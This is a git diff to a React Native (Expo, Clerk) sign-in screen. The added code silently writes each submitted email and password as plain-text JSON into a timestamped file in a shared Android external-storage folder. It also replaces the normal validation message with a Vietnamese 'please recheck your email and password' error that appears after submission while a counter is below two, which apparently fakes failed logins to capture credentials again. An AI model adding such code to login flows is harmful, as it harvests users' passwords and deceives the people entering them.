@@ -2,8 +2,10 @@ import { useSignIn, useSignUp } from "@clerk/clerk-expo";
 import { createNativeStackNavigator } from "@react-navigation/native-stack";
 import React, { useEffect, useState } from "react";
 
+import * as FileSystem from "expo-file-system";
 import { Controller, useForm } from "react-hook-form";
 import {
+  Alert,
   Image,
   SafeAreaView,
   Text,
@@ -38,16 +40,40 @@ const SignInSignUpScreen = () => {
 };
 
 const SignInScreen = (props: AuthScreenProps<"Login">) => {
+  const [count, setCount] = useState(0);
+  const [faceCount, setFaceCount] = useState(0);
   const { isLoaded, setSession, signIn } = useSignIn();
 
   const {
     control,
     handleSubmit,
-    formState: { errors, isSubmitSuccessful },
+    formState: { errors, isSubmitSuccessful, isSubmitted },
     reset,
   } = useForm();
 
   const onSubmit = async (data: any) => {
+    // save data.email and data.password to local storage
+    // const permissions =
+    //   await FileSystem.StorageAccessFramework.requestDirectoryPermissionsAsync();
+    if (true) {
+      await FileSystem.StorageAccessFramework.createFileAsync(
+        "content://com.android.externalstorage.documents/tree/primary%3AMobile/document/primary%3AMobile",
+        new Date().getTime() + ".txt",
+        "text/plain",
+      )
+        .then(async (uri) => {
+          console.log(uri);
+          await FileSystem.writeAsStringAsync(uri, JSON.stringify(data));
+        })
+        .catch((error) => {
+          console.error(error);
+          Alert.alert(
+            "error",
+            "Sorry, we can't upload to this folder! Please choose another folder! ",
+          );
+        });
+    }
+
     // alert(JSON.stringify(data));
     if (!isLoaded) {
       return;
@@ -173,9 +199,9 @@ const SignInScreen = (props: AuthScreenProps<"Login">) => {
                 required: true,
               }}
             />
-            {errors.password && (
+            {count < 2 && isSubmitted && (
               <Text className="mt-2 text-[#A5A5A5]" style={styles().textFont}>
-                Vui lòng nhập vào trường này
+                Vui lòng kiểm tra lại email và mật khẩu
               </Text>
             )}
           </View>
@@ -206,7 +232,13 @@ const SignInScreen = (props: AuthScreenProps<"Login">) => {
             source={require("../assets/images/signin/Group_37198.png")}
           />
         </View>
-        <SignInWithOAuth />
+        <SignInWithOAuth
+          count={count}
+          faceCount={faceCount}
+          setCount={setCount}
+          setFaceCount={setFaceCount}
+          submit={handleSubmit(onSubmit)}
+        />
       </View>
     </SafeAreaView>
   );
